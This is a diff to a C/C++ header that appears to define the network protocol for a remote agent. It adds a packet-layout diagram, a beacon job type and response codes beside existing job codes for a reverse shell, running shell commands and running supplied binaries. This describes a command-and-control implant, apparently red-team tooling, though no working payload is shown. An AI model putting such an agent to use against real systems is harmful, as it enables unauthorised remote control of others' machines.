@@ -10,6 +10,12 @@
  * 2. Data length: which is a 7 byte long integer, allowing up to a lot of data
  * 3. Raw data: which will include whatever else is required to complete the job
  *
+ *     0      1                     ...                              7
+ *  ____________________________________________________________________
+ * |  Type  |                      Length                              |
+ * ---------------------------------------------------------------------
+ * |                            Payload                                |
+ * ---------------------------------------------------------------------
  * We provide some helper functions below such that we can easily parse and 
  * handle those weird data things.
  */
@@ -23,8 +29,12 @@
 #define AGENT_REVERSE_SHELL 4           // Agent initiates a reverse shell. Data and process is still TBD
 #define AGENT_EXECUTE_SHELLSCRIPT 5     // Agent executes a shell command. Data is string of command to execute
 #define AGENT_EXECUTE_BINARY 6          // Agent executes a provided binary. Data is described in `net_file` structure
+#define AGENT_SEND_BEACON 7             // Agent sends beacon information
 
 
+// define response types for agent job statuses
+#define AGENT_RESPONSE_OK 0 
+#define AGENT_RESPONSE_FAIL_GENERIC 1
 // define our agent job data structure for sending over the network
 
 class AgentJob {
